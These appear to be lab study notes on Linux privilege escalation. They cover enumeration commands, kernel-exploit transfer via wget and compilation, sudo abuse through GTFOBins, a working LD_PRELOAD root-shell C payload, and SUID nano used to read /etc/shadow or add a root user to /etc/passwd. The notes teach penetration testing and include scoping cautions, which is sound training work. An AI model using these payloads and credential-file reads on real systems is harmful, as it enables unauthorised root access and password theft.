# Linux Privilege Escalation
## What is Privilege Escalation?
* Going from a lower permission account to a higher permission one.
* Exploitation of a vulnerability, design flaw, or configuration oversight in an OS or application to gain unauthorised access to resources that are usually restricted from the users.

## Why is it important?
* Rare to be able to gain a foothold (initial access) that gives direct administrative access.
* Gaining system administrator levels of access allows additional actions to be perfromed.
 * Resetting passwords.
 * Bypassing access controls to compromise protected data.
 * Editing software configurations.
 * Enabling persistence.
 * Changing the privilege of existing (or new) users.
 * Execute any administrative command.

## Enumeration
* First step to take once access is gained to any system.
  * May have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account.
* Enumeration is as important during the post-compromise phase as it is before.

### `hostname`
* `hostname` command return the hostname of the target machine.
* Can provide information about the target system’s role within the corporate network.
  * SQL-PROD-01 for a production SQL server.

### `uname -a`
* Prints system information giving additional detail about the kernel used by the system.
* Useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

### `/proc/version`
* Proc filesystem (procfs) provides information about the target system processes.
* Essential Linux tool to have in the arsenal.
* `cat /proc/version` may give information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

### `/etc/issue`
* Systems can be identified by reading the `/etc/issue` file using `cat`.
* Usually contains some information about the OS.

### `ps` Command
* Effective way to see the running processes on a Linux system.
* Shows processes for the current shell.
* Output of the `ps` (Process Status).
  * PID: The process ID (unique to the process).
  * TTY: Terminal type used by the user.
  * Time: Amount of CPU time used by the process (this is NOT the time this process has been running for).
  * CMD: The command or executable running (will NOT display any command line parameter).
* Provides a few useful options.
  * `ps -A`: View all running processes.
  * `ps axjf`: View process tree.

#### `ps aux`
* Shows processes for all users (a).
* Displays the user that launched the process (u).
* Shows processes that are not attached to a terminal (x).
* Output gives a better understanding of the system and potential vulnerabilities.

#### `env`
* Show environmental variables.
* `PATH` variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

#### `sudo -l`
* The target system may be configured to allow users to run some (or all) commands with root privileges.
* Used to list all commands the current user can run using sudo.

#### `ls`
* Always use `ls -la` while looking for potential privilege escalation vectors.

#### `Id`
* Provides a general overview of the user’s privilege level and group memberships.
* Can be used to obtain the same information for another user.

#### `/etc/passwd`
* Reading the `/etc/passwd` file with 'cat' can be an easy way to discover users on the system.
* Output can be easily cut and converted to a useful list for brute-force attacks.
```
cat /etc/passwd | cut -d ":" -f 1
``` 
* Grep for 'home' as real users will most likely have their folders under this directory.
```
cat /etc/passwd | grep home
```

#### `history`
* Looking at earlier commands with the `history` command can give some idea about the target system.
* Rarely has stored information such as passwords or usernames.

#### `ifconfig`
* Gives information about the network interfaces of the system.
* Target system may be a pivoting point to another network.
  * Target may have three interfaces (eth0, tun0, and tun1).
  * Attacker can reach the eth0 interface but can not directly access the two other networks.
  * Confirm using `ip route` command to see which network routes exist. 

#### `netstat`
* Worth looking into existing communications.
* Used with several different options to gather information on existing connections.
  * `netstat -a`: shows all listening ports and established connections.
  * `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
  * `netstat -l`: list ports in 'listening' mode.
    * These ports are open and ready to accept incoming connections.
    * Use with `t` option to list only ports that are listening using the TCP protocol.
  * `netstat -s`: list network usage statistics by protocol.
    * Use with `-t` or `-u` options to limit the output to a specific protocol.
  * `netstat -tp`: list connections with the service name and PID information.
    * Use with `-l` to list listening ports.
    * `PID/Program name` column will be empty if the process is owned by another user.
  * `netstat -i`: Shows interface statistics.
* `netstat -ano` usage is seen most often.
  * `-a`: Display all sockets
  * `-n`: Do not resolve names
  * `-o`: Display timers

#### `find` Command
* Searching the target system for important information and potential privilege escalation vectors can be fruitful.

| Command | Purpose
| --- | ---
| `find . -name flag1.txt` | Find the file named `flag1.txt` in the current directory.
| `find /home -name flag1.txt` | Find the file names `flag1.txt` in the `/home` directory.
| `find / -type d -name config` | Find the directory named config under `/`.
| `find / -type f -perm 0777` | Find files with the 777 permissions (files readable, writable, and executable by all users).
| `find / -perm a=x` find executable files.
| `find /home -user frank` | Find all files for user `frank` under `/home`.
| `find / -mtime 10` | Find files that were modified in the last 10 days.
| `find / -atime 10` | Find files that were accessed in the last 10 day.
| `find / -cmin -60` | Find files changed within the last hour (60 minutes).
| `find / -amin -60` | Find files accessed within the last hour (60 minutes).
| `find / -size 50M` | Find files with a 50 MB size. This command can also be used with `+` and `-` signs to specify a file that is larger or smaller than the given size.

* Tends to generate errors which can make output hard to read.
  * Use `find -type f 2>/dev/null` to redirect errors to `/dev/null` and have a cleaner output.
* Folders and files that can be written to or executed from.

| Command | Purpose 
| --- | ---
| `find / -writable -type d 2>/dev/null` | Find world-writeable folders.
| `find / -perm -222 -type d 2>/dev/null` | Find world-writeable folders.
| `find / -perm -o w -type d 2>/dev/null` | Find world-writeable folders.

* `perm` parameter affects how `find` works.
  * `find / -perm -o x -type d 2>/dev/null` find world-executable folders.
* Find development tools and supported languages.
```
find / -name perl*
```
```
find / -name python*
```
```
find / -name gcc*
```
* Find files that have the SUID bit set.
  * SUID bit allows the file to run with the privilege level of the account that owns it rather than the account which runs it.
  * Allows for an interesting privilege escalation path.
```
find / -perm -u=s -type f 2>/dev/null
``` 

## Automated Enumeration Tools
* These tools should only be used to save time knowing they may miss some privilege escalation vectors.
* Target system’s environment will influence the tool to use.
  * Cannot run a tool written in Python if it is not installed on the target system.
* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
* [LinEnum](https://github.com/rebootuser/LinEnum).
* [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester).
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
* [Linux Priv Checker](https://github.com/linted/linuxprivchecker).

## Privilege Escalation: Kernel Exploits
* Privilege escalation ideally leads to root privileges.
  * May be achieved by exploiting an existing vulnerability or by accessing another user account that has more privileges, information, or access.
* Privilege escalation process will rely on misconfigurations and lax permissions unless a single vulnerability leads to a root shell.
* Linux kernel manages communication between components such as the memory on the system and applications.
  * Requires the kernel to have specific privileges.
  * Successful exploit will potentially lead to root privileges.
* Kernel exploit methodology is simple.
  * Identify the kernel version.
  * Search and find an exploit code for the kernel version of the target system.
  * Run the exploit.
* Failed kernel exploits can lead to a system crash.
  * Ensure this potential outcome is acceptable within the scope of the penetration testing engagement before attempting a kernel exploit.

### Research sources
* Use Google to search for existing exploit code based on enumeration findings.
* [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) can be useful.
* Use a script like LES (Linux Exploit Suggester).
  * Can generate false positives (report a kernel vulnerability that does not affect the target system).
  * Can generate false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

### Hints/Notes
* Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit.
* Understand how the exploit code works BEFORE launching it.
* Some exploit codes can make changes on the OS that would make them insecure in further use or make irreversible changes to the system.
  * This creates problems later.
  * Absolute no-nos during a real penetration testing engagement.
* Some exploits may require further interaction once they are run.
* Read all comments and instructions provided with the exploit code.
* Transfer exploit code from the attacking machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.

## The steps of the Kernel exploit Methodology
* Identify the kernel version.
```
uname -a
```
* Find an exploit code for the kernel version of the target system.
  * Use [Exploit Database](https://www.exploit-db.com) to search for an existing exploit code.
* Download the exploit to the attacking machine.
* Serve the exploit code to the target using `SimpleHTTPServer` Python module.
```
python3 -m http.server 9000
```
* Use `wget` on target machine to copy the code across.
```
wget http://10.10.166.35:9000/37392.c -P /tmp/
```
  * `-P` option specifies that the file should be saved to the `/tmp/` directory on the target.
  * Specify the path as `/tmp/` where the file be downloaded to avoid the permission error while running `wget` because you are a low-level privilege user (karen).
* Run the exploit file to perform privilege escalation.
> Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
  * Rename exploit file.
```
ofc.c: mv ./37392.c ofc.c
```
  * Compile the C source code file `ofs.c` into a binary executable file named `ofs`.
```
gcc ofs.c -o ofs
```
  * `gcc` is the GNU Compiler Collection.
    * Commonly used compiler for the C programming language on Linux.
  * `ofs.c` file contains the C source code that will be compiled into the executable file.
  * `-o` option specifies the output file name, which in this case is `ofs`.
 * Type `./ofs` to run the compiled executable file.
* Verify that root privilege has been gained.
```
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

## Privilege Escalation: Sudo
The sudo command, by default, allows you to run a program with root privileges.
Under some conditions, system administrators may need to give regular users some flexibility on their privileges. 
For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. 
In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.
Any user can check its current situation related to root privileges using the sudo -l command.
https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
E.g. user has sudo rights on nmap command
The interactive mode, available on versions 2.02 to 5.21, can be used to spawn a root shell: sudo nmap --interactive
E.g. user has sudo rights on find command:
find . -exec /bin/sh \; -quit may be able to break out from restricted environments by spawning an interactive system shell

Leverage application functions
Some applications will not have a known exploit within this context. 
Such an application you may see is the Apache2 server.
In this case, we can use a "hack" to leak information leveraging a function of the application. 
As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).
Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.
Leverage LD_PRELOAD
On some systems, you may see the LD_PRELOAD environment option.
LD_PRELOAD is a function that allows any program to use shared libraries. 
This blog post will give you an idea about the capabilities of LD_PRELOAD. 
If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. 
Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
The steps of this privilege escalation vector can be summarised as follows:
Check for LD_PRELOAD (with the env_keep option)
Write a simple C code compiled as a share object (.so extension) file
Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
The C code will simply spawn a root shell and can be written as follows:
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
We can save this code as shell.c and compile it using gcc (GNU Compiler Collection) into a shared object file using the following parameters:
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
We can now use this shared object file when launching any program our user can run with sudo. 
In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
We need to run the program by specifying the LD_PRELOAD option, as follows;
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
This will result in a shell spawn with root privileges.

Privilege Escalation: SUID
Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. 
Files can have read, write, and execute permissions. 
These are given to users within their privilege levels. 
This changes with SUID (Set-user Identification) and SGID (Set-group Identification).
These allow files to be executed with the permission level of the file owner or the group owner, respectively.
You will notice these files have an “s” bit set showing their special permission level.
find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.
A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). 
Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).
The list above shows that nano has the SUID bit set. 
Unfortunately, GTFObins does not provide us with an easy win. 
Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.
The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. 
Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. 
At this stage, we have two basic options for privilege escalation: reading the /etc/shadow file or adding our user to /etc/passwd.
Reading the /etc/shadow file
We see that the nano text editor has the SUID bit set by running the find / -type f -perm -04000 -ls 2>/dev/null command.
nano /etc/shadow will print the contents of the /etc/shadow file. 
We can now use the unshadow tool to create a file crackable by John the Ripper. 
To achieve this, unshadow needs both the /etc/shadow and /etc/passwd files.
The unshadow tool’s usage: unshadow passwd.txt shadow.txt > passwords.txt
With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext.
The other option would be to add a new user that has root privileges. 
This would help us circumvent the tedious process of password cracking. 
We will need the hash value of the password we want the new user to have. 
This can be done quickly using the openssl tool on Kali Linux.
We will then add this password with a username to the /etc/passwd file.
Once our user is added (please note how root:/bin/bash was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges. 
